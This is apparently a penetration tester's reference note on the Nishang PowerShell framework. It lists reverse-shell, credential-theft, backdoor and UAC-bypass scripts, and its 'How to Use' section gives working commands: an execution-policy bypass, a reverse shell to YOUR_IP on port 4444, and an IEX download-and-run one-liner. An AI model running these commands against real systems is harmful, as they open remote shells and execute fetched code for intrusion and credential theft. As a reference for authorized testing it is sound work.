---
tags: [tool, privesc, windows, powershell]
tool: "nishang"
category: "Privesc"
installed: true
phase: [shells, post-exploit]
---

# Nishang - PowerShell Offensive Framework

## Tool Overview
Purpose: Collection of PowerShell scripts for penetration testing
Location: /usr/share/nishang/

## Key Scripts

### Shells
Location: /usr/share/nishang/Shells/
- Invoke-PowerShellTcp.ps1 - Reverse shell
- Invoke-PowerShellTcpOneLine.ps1 - One-liner reverse shell

### Gather (Credential Theft)
Location: /usr/share/nishang/Gather/
- Get-PassHashes.ps1 - Extract password hashes
- Keylogger.ps1 - Keylogging
- Invoke-Mimikatz.ps1 - Mimikatz wrapper

### Backdoors
Location: /usr/share/nishang/Backdoors/
- HTTP-Backdoor.ps1 - HTTP-based backdoor
- DNS_TXT_Pwnage.ps1 - DNS TXT command/control

### Escalation
Location: /usr/share/nishang/Escalation/
- Invoke-PsUACme.ps1 - UAC bypass

## How to Use

Reverse Shell:
powershell -ep bypass
. /usr/share/nishang/Shells/Invoke-PowerShellTcp.ps1
Invoke-PowerShellTcp -Reverse -IPAddress YOUR_IP -Port 4444

One-Liner Download:
powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://YOUR_IP:8000/Shells/Invoke-PowerShellTcp.ps1')"

Transfer to Target:
On Kali: cd /usr/share/nishang && python3 -m http.server 8000
On target: powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://YOUR_IP:8000/Shells/Invoke-PowerShellTcp.ps1')"
